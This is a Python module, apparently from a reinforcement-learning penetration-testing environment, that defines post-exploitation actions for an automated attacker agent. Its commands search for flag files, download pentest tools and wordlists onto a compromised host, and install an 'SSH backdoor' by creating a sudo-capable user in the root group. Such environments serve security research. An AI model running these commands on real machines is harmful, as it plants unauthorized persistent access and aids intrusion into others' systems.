from gym_pycr_pwcrack.dao.action.action import Action
from gym_pycr_pwcrack.dao.action.action_type import ActionType
from gym_pycr_pwcrack.dao.action.action_id import ActionId
from gym_pycr_pwcrack.dao.action.action import ActionOutcome

class ShellActions:

    @staticmethod
    def FIND_FLAG(index : int) -> Action:
        id = ActionId.FIND_FLAG
        cmd = ["find / -name 'flag*.txt'  2>&1 | grep -v 'Permission denied'"]
        alt_cmd = ["find / | grep 'flag*'"]
        return Action(id=id, name="Find flag", cmd=cmd,
                      type=ActionType.POST_EXPLOIT,
                      descr="Searches the file system for a flag",
                      cost=0.0, noise=0.0, index=index,
                      ip=None, subnet=False, action_outcome=ActionOutcome.FLAG, alt_cmd=alt_cmd)

    @staticmethod
    def INSTALL_TOOLS(index: int) -> Action:
        id = ActionId.INSTALL_TOOLS
        cmd = ["sudo apt-get -y install nmap ssh git unzip",
               "cd /;sudo wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip && sudo unzip -o SecList.zip && sudo rm -f SecList.zip && sudo mv SecLists-master /SecLists"]
        return Action(id=id, name="Install tools", cmd=cmd,
                      type=ActionType.POST_EXPLOIT,
                      descr="If taken root on remote machine, installs pentest tools, e.g. nmap",
                      cost=0.0, noise=0.0, index=index,
                      ip=None, subnet=False, action_outcome=ActionOutcome.PIVOTING, alt_cmd=None)

    @staticmethod
    def SSH_BACKDOOR(index: int) -> Action:
        id = ActionId.SSH_BACKDOOR
        cmd = ["sudo service ssh start", "sudo useradd -rm -d /home/{} -s /bin/bash -g root -G sudo -p \"$(openssl passwd -1 '{}')\" {}"]
        return Action(id=id, name="Install SSH backdoor", cmd=cmd,
                      type=ActionType.POST_EXPLOIT,
                      descr="If taken root on remote machine, installs a ssh backdoor, useful for upgrading telnet"
                            "or weaker channels",
                      cost=0.0, noise=0.0, index=index,
                      ip=None, subnet=False, action_outcome=ActionOutcome.PIVOTING, alt_cmd=None)